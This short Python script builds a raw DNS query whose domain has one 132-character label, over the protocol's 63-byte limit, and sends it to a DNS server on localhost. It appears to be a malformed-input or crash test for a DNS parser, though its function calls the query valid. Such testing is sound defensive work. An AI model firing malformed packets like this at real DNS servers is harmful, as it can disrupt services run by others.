import socket
import struct

def create_valid_dns_query(domain):
    transaction_id = b'\xaa\xaa'
    flags = b'\x01\x00'
    qdcount = b'\x00\x01'
    ancount = nscount = arcount = b'\x00\x00'
    question = b''.join(bytes([len(label)]) + label.encode() for label in domain.split('.')) + b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return transaction_id + flags + qdcount + ancount + nscount + arcount + question + qtype + qclass

def send_dns_query(server_ip, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    domain = "a" * 132 + ".com"
    dns_query = create_valid_dns_query(domain)
    sock.sendto(dns_query, (server_ip, port))
    sock.close()

send_dns_query("127.0.0.1")
